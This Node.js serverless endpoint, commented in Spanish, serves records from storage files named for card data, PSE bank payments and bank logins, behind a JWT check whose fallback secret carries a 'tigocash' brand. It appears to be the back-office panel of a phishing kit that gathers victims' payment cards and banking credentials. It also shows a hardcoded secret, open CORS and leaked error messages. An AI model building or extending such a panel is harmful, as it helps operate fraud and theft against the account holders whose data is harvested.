require('dotenv').config();
const AWS = require('aws-sdk');
const crypto = require('crypto');

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;
const SECRET_KEY = process.env.JWT_SECRET || 'tigocash-secret-2026-key';

// Validar JWT
function validarJWT(token) {
    try {
        const parts = token.split('.');
        if (parts.length !== 3) return false;

        const [header, payload, signature] = parts;
        const expectedSignature = crypto
            .createHmac('sha256', SECRET_KEY)
            .update(`${header}.${payload}`)
            .digest('base64');

        if (signature !== expectedSignature) return false;

        const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
        if (decoded.exp && decoded.exp < Math.floor(Date.now() / 1000)) return false;

        return true;
    } catch (error) {
        return false;
    }
}

async function obtenerTransacciones() {
    const transacciones = [];

    // Leer principalmente datos_tarjeta.txt (datos completos de transacciones)
    const archivoPrincipal = 'datos_tarjeta.txt';

    try {
        const data = await new Promise((resolve, reject) => {
            s3.getObject({ Bucket: BUCKET, Key: archivoPrincipal }, (err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });

        const contenido = data.Body.toString();
        const lineas = contenido.split('\n').filter(l => l.trim());

        lineas.forEach(linea => {
            try {
                const obj = JSON.parse(linea);
                transacciones.push({ ...obj, tipo: 'tarjeta', archivo: archivoPrincipal });
            } catch (e) {
                // Ignorar líneas inválidas
            }
        });
    } catch (error) {
        // Si no hay tarjetas, leer otros archivos como fallback
        const archivosFallback = ['datos_pse.txt', 'datos_blogin.txt', 'datos_consultas.txt'];

        for (const archivo of archivosFallback) {
            try {
                const data = await new Promise((resolve, reject) => {
                    s3.getObject({ Bucket: BUCKET, Key: archivo }, (err, data) => {
                        if (err) reject(err);
                        else resolve(data);
                    });
                });

                const contenido = data.Body.toString();
                const lineas = contenido.split('\n').filter(l => l.trim());

                lineas.forEach(linea => {
                    try {
                        const obj = JSON.parse(linea);
                        const tipo = archivo.replace('datos_', '').replace('.txt', '');
                        transacciones.push({ ...obj, tipo, archivo });
                    } catch (e) {
                        // Ignorar líneas inválidas
                    }
                });
            } catch (error) {
                // Continuar con siguiente archivo
            }
        }
    }

    return transacciones.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'GET') return res.status(400).json({ ok: false, error: 'GET requerido' });

    try {
        // Validar token
        const authHeader = req.headers.authorization;
        const token = authHeader ? authHeader.replace('Bearer ', '') : null;

        if (!token || !validarJWT(token)) {
            return res.status(401).json({ ok: false, error: 'No autorizado' });
        }

        const transacciones = await obtenerTransacciones();
        return res.status(200).json({ ok: true, transacciones });
    } catch (error) {
        console.error('Error:', error);
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
